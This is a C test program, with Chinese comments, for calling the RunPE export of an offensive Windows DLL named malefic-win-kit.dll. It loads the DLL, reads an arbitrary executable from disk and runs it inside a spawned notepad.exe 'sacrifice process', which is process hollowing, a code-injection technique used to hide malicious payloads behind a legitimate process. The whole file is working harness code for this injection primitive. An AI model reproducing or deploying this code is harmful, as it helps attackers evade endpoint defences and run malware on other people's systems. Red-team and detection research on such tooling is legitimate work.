/*
 * C 语言调用 malefic-win-kit.dll 示例
 * 编译: gcc runpe_test.c -o runpe_test.exe
 * 运行: runpe_test.exe target.exe
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// RawString 结构体定义（必须与 Rust 匹配）
typedef struct {
    unsigned char *data;
    size_t len;
    size_t capacity;
} RawString;

// 函数指针类型定义
typedef void (*RunPEFunc)(
    RawString *result,           // 返回值指针（第一个参数！）
    const unsigned char *start_commandline,
    size_t start_commandline_len,
    const unsigned char *hijack_commandline,
    size_t hijack_commandline_len,
    const unsigned char *data,
    size_t data_size,
    const unsigned char *entrypoint,
    size_t entrypoint_len,
    const unsigned char *args,
    size_t args_len,
    int is_x86,
    unsigned int pid,
    int block_dll,
    int need_output
);

typedef void (*SafeFreeFunc)(const unsigned char *data);

// 读取文件到内存
unsigned char* readFile(const char* filename, size_t* size) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        printf("Error: Cannot open file %s\n", filename);
        return NULL;
    }

    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* data = (unsigned char*)malloc(*size);
    if (!data) {
        fclose(f);
        return NULL;
    }

    size_t read = fread(data, 1, *size, f);
    fclose(f);

    if (read != *size) {
        free(data);
        return NULL;
    }

    return data;
}

int main(int argc, char* argv[]) {
    printf("=== Malefic-Win-Kit C Test ===\n\n");

    if (argc < 2) {
        printf("Usage: %s <target.exe>\n", argv[0]);
        printf("Example: %s gogo.exe\n", argv[0]);
        return 1;
    }

    // 1. 加载 DLL
    printf("[*] Loading malefic_win_kit.dll...\n");
    HMODULE hDll = LoadLibraryA("malefic_win_kit.dll");
    if (!hDll) {
        printf("[-] Failed to load DLL: Error %lu\n", GetLastError());
        return 1;
    }
    printf("[+] DLL loaded successfully\n");

    // 2. 获取函数地址
    printf("[*] Getting function addresses...\n");
    RunPEFunc RunPE = (RunPEFunc)GetProcAddress(hDll, "RunPE");
    SafeFreeFunc SafeFreePipeData = (SafeFreeFunc)GetProcAddress(hDll, "SafeFreePipeData");

    if (!RunPE) {
        printf("[-] Failed to find RunPE function\n");
        FreeLibrary(hDll);
        return 1;
    }

    if (!SafeFreePipeData) {
        printf("[-] Failed to find SafeFreePipeData function\n");
        FreeLibrary(hDll);
        return 1;
    }
    printf("[+] Functions found successfully\n");

    // 3. 读取 PE 文件
    printf("[*] Reading PE file: %s\n", argv[1]);
    size_t peSize;
    unsigned char* peData = readFile(argv[1], &peSize);
    if (!peData) {
        printf("[-] Failed to read PE file\n");
        FreeLibrary(hDll);
        return 1;
    }
    printf("[+] Loaded PE: %zu bytes\n", peSize);

    // 验证 PE 魔数
    if (peSize < 2 || peData[0] != 'M' || peData[1] != 'Z') {
        printf("[-] Invalid PE file (missing MZ header)\n");
        free(peData);
        FreeLibrary(hDll);
        return 1;
    }

    // 4. 准备参数
    const char* sacrificeProcess = "C:\\Windows\\System32\\notepad.exe";
    printf("[*] Sacrifice process: %s\n", sacrificeProcess);

    // 5. 调用 RunPE
    printf("[*] Calling RunPE...\n\n");

    RawString result;
    memset(&result, 0, sizeof(RawString));

    // 重要：在 Windows x64 下，返回值指针作为第一个参数传递！
    RunPE(
        &result,                                    // 返回值指针
        (const unsigned char*)sacrificeProcess,     // start_commandline
        strlen(sacrificeProcess),                   // start_commandline_len
        NULL,                                       // hijack_commandline
        0,                                          // hijack_commandline_len
        peData,                                     // data
        peSize,                                     // data_size
        NULL,                                       // entrypoint
        0,                                          // entrypoint_len
        NULL,                                       // args
        0,                                          // args_len
        0,                                          // is_x86 (false)
        0,                                          // pid (0 = create new)
        0,                                          // block_dll (false)
        1                                           // need_output (true)
    );

    // 6. 处理结果
    printf("=== Result ===\n");
    printf("Data pointer: %p\n", result.data);
    printf("Length: %zu\n", result.len);
    printf("Capacity: %zu\n\n", result.capacity);

    if (result.data && result.len > 0) {
        printf("=== Output ===\n");
        // 安全地打印输出（防止非 ASCII 字符）
        for (size_t i = 0; i < result.len; i++) {
            if (result.data[i] >= 32 && result.data[i] <= 126) {
                putchar(result.data[i]);
            } else if (result.data[i] == '\n' || result.data[i] == '\r') {
                putchar(result.data[i]);
            } else {
                printf("\\x%02x", result.data[i]);
            }
        }
        printf("\n=============\n\n");

        // 7. 释放内存
        printf("[*] Freeing memory...\n");
        SafeFreePipeData(result.data);
        printf("[+] Memory freed\n");
    } else {
        printf("[-] No output received or execution failed\n");
    }

    // 8. 清理
    free(peData);
    FreeLibrary(hDll);

    printf("\n[+] Done!\n");
    return 0;
}
